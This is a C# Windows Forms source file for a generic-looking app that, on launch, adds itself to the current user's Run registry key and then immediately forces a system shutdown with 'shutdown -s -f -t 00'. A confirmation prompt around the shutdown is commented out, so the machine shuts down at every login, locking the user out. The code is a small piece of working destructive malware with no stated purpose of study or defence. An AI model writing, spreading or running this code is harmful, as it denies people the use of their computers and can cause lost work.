using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace WindowsFormsApplication1
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent(); 
            Microsoft.Win32.RegistryKey reg;
            reg = Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
            try
            {

                reg.SetValue("MyProgram", Application.ExecutablePath);

                reg.Close();

            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
           // if (MessageBox.Show("Off", "off", MessageBoxButtons.OKCancel) == DialogResult.OK)
           // {
                System.Diagnostics.Process.Start("cmd", "/c shutdown -s -f -t 00");
           // }
          //  else this.Close();
        }

        private void button1_Click(object sender, EventArgs e)
        {Microsoft.Win32.RegistryKey reg;
            reg = Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
            try
            {

                reg.SetValue("MyProgram", Application.ExecutablePath);

                reg.Close();

            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
            
          /*  Microsoft.Win32.RegistryKey myKey =
Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            myKey.SetValue("MyProgram", Application.ExecutablePath);*/
        }
    }
}
